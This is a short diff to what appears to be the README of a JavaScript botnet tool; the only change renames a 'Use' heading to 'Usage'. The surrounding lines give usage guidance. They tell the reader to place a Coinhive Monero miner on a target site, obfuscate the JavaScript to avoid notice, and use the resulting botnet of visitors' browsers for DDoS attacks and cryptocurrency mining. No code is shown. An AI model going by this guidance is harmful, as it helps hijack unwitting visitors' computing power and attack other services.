@@ -17,7 +17,7 @@ the target site. Also, update miner.html with your coinhive Site key so you can 
 Botnet. For added security I would recomend using a Javascript Obfuscator
 https://javascriptobfuscator.com/Javascript-Obfuscator.aspx
 
-# Use
+# Usage
 Can be used to conduct a DDoS Attack, it can be also used to mine Monero and preform calculations.
 For voluntary participants have them upload node.js to their website. Then anyone running that JavaScript file will be a willing 
 participant in your botnet.
